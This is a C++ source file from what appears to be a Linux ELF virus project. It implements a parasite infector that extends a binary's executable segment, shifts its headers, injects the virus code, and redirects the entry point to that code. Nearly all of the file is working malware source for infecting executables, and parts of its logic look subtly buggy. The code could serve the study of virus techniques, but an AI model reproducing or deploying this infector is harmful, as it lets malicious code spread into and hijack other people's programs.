#include "infector/extend_code_infect.hh"
#include <linux/elf.h>
#include <linux/limits.h>
#include "common/file_descriptor.hh"
#include "common/patch_pattern.hh"
#include "common/patch_relinguish_control.hh"
#include "std/string.hh"

namespace vt::infector {

namespace {
struct ElfInfo {
  Elf64_Addr original_e_entry;
  Elf64_Addr parasite_file_offset;
  Elf64_Addr parasite_load_address;
  size_t code_segment_idx;
  size_t last_section_idx_in_code;
};

uint64_t next_32_bit_aligned_addr(uint64_t v) { return (v & ~(4 - 1)) + 4; }
uint64_t round_up_to_page(uint64_t v) { return (v & ~(4096 - 1)) + 4096; }

bool patch_sht(const Elf64_Ehdr& ehdr, Elf64_Shdr& shdr,
               size_t padded_virus_size, const ElfInfo& info) {
  auto sht_entry_count = ehdr.e_shnum;
  auto section_entry_start = &shdr;

  // Extend the last section in code
  auto last_section_in_code =
      section_entry_start + info.last_section_idx_in_code;
  last_section_in_code->sh_size += padded_virus_size;

  // Shift all section entries back.
  for (auto cur_entry = last_section_in_code + 1;
       cur_entry < section_entry_start + sht_entry_count; ++cur_entry) {
    cur_entry->sh_offset += padded_virus_size;
    if (cur_entry->sh_addr) {
      cur_entry->sh_addr += padded_virus_size;
    }
  }
  return true;
}

void patch_phdr(const Elf64_Ehdr& ehdr, Elf64_Phdr& phdr,
                uint64_t padded_virus_size, const ElfInfo& info) {
  auto pht_entry_count = ehdr.e_phnum;
  auto phdr_entry_start = &phdr;

  // Point to first phdr
  // Extend the last section in code
  auto code_segment_entry = phdr_entry_start + info.code_segment_idx;
  auto original_code_segment_end =
      code_segment_entry->p_offset + code_segment_entry->p_filesz;
  code_segment_entry->p_filesz += padded_virus_size;
  code_segment_entry->p_memsz += padded_virus_size;
  // For other entries that has p_offset after CODE segment, shift them.
  for (auto cur_entry = phdr_entry_start;
       cur_entry < phdr_entry_start + pht_entry_count; ++cur_entry) {
    // Shift segments behind code segment back
    if (cur_entry->p_offset > original_code_segment_end) {
      if (cur_entry->p_offset) {
        cur_entry->p_offset += padded_virus_size;
      }
      if (cur_entry->p_vaddr) {
        cur_entry->p_vaddr += padded_virus_size;
      }
      if (cur_entry->p_paddr) {
        cur_entry->p_paddr += padded_virus_size;
      }
    }
  }

  // parasite offset is always aligned to 4 bytes. However, the original segment
  // end might not. When calculating the new size, add the extra alignment bytes
  // if needed.
}

void patch_ehdr(Elf64_Ehdr& ehdr, const ElfInfo& info,
                size_t padded_virus_size) {
  if (ehdr.e_type == ET_EXEC) {
    ehdr.e_entry = info.parasite_load_address;
  } else if (ehdr.e_type == ET_DYN) {
    ehdr.e_entry = info.parasite_file_offset;
  } else {
    CHECK_FAIL();
  }
  ehdr.e_shoff += padded_virus_size;
}

bool get_info(const Elf64_Ehdr& ehdr, const Elf64_Phdr& phdr,
              const Elf64_Shdr& shdr, ElfInfo& info) {
  info.original_e_entry = ehdr.e_entry;

  // Find code segment
  const Elf64_Phdr* phdr_entry = &phdr;
  for (size_t i = 0; i < ehdr.e_phnum; ++i, ++phdr_entry) {
    if (phdr_entry->p_type == PT_LOAD && phdr_entry->p_flags == (PF_R | PF_X)) {
      info.code_segment_idx = i;
      auto code_segment_end_offset =
          phdr_entry->p_filesz + phdr_entry->p_offset;
      printf("%x + %x\n", phdr_entry->p_offset, phdr_entry->p_filesz);
      printf("found code segment idx %d, file end offset %x\n", i,
             code_segment_end_offset);
      info.parasite_file_offset =
          next_32_bit_aligned_addr(code_segment_end_offset);
      info.parasite_load_address =
          next_32_bit_aligned_addr(phdr_entry->p_vaddr + phdr_entry->p_filesz);
      break;
    }
  }
  auto code_segment_end = phdr_entry->p_offset + phdr_entry->p_filesz;

  // Find last section in code segment.
  auto shdr_entry = &shdr;
  for (size_t i = 0; i < ehdr.e_shentsize; ++i, ++shdr_entry) {
    if (shdr_entry->sh_offset > code_segment_end) {
      printf("sh offset %x code segment end %x\n", shdr_entry->sh_offset,
             code_segment_end);
      printf("last section in code segment, idx %d\n", i - 1);
      info.last_section_idx_in_code = i - 1;
      break;
    }
  }
  return true;
}  // namespace

}  // namespace

bool extend_code_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
                          vt::common::Mmap<PROT_READ> parasite_mapping) {
  const auto& ehdr = *reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
  if (ehdr.e_type == ET_REL || ehdr.e_type == ET_CORE ||
      ehdr.e_ident[EI_CLASS] == ELFCLASS32) {
    return false;
  }

  ElfInfo info{};
  const auto& phdr =
      *reinterpret_cast<const Elf64_Phdr*>(host_mapping.base() + ehdr.e_phoff);
  const auto& shdr =
      *reinterpret_cast<const Elf64_Shdr*>(host_mapping.base() + ehdr.e_shoff);
  if (!get_info(ehdr, phdr, shdr, info)) {
    printf("Cannot correctly parse host elf phdr\n");
    return false;
  }

  auto padded_virus_size = round_up_to_page(parasite_mapping.size());

  {
    auto& mutable_phdr = *reinterpret_cast<Elf64_Phdr*>(
        host_mapping.mutable_base() + ehdr.e_phoff);
    patch_phdr(ehdr, mutable_phdr, padded_virus_size, info);
  }

  {
    auto& mutable_shdr = *reinterpret_cast<Elf64_Shdr*>(
        host_mapping.mutable_base() + ehdr.e_shoff);
    if (!patch_sht(ehdr, mutable_shdr, padded_virus_size, info)) {
      printf("Failed to patch section header table\n");
      return false;
    }
  }

  {
    auto& mutable_ehdr =
        *reinterpret_cast<Elf64_Ehdr*>(host_mapping.mutable_base());
    patch_ehdr(mutable_ehdr, info, padded_virus_size);
  }

  printf("inject parasite at %x\n", info.parasite_file_offset);
  printf("entry changed to %x\n", ehdr.e_entry);
  // Shift old content back.
  memcpy(host_mapping.mutable_base() + info.parasite_file_offset +
             padded_virus_size,
         host_mapping.mutable_base() + info.parasite_file_offset,
         host_mapping.size() - padded_virus_size - info.parasite_file_offset);
  // Clear old content. Not required.
  memset(host_mapping.mutable_base() + info.parasite_file_offset, 0x00,
         padded_virus_size);
  // Inject the virus.
  memcpy(host_mapping.mutable_base() + info.parasite_file_offset,
         parasite_mapping.base(), parasite_mapping.size());

  return patch_parasite_and_relinquish_control(
      ehdr.e_type, info.original_e_entry, info.parasite_load_address,
      info.parasite_file_offset, parasite_mapping.size(), host_mapping);
}

size_t ExtendCodeInfect::output_size(size_t host_size, size_t parasite_size) {
  return host_size + round_up_to_page(parasite_size);
}

}  // namespace vt::infector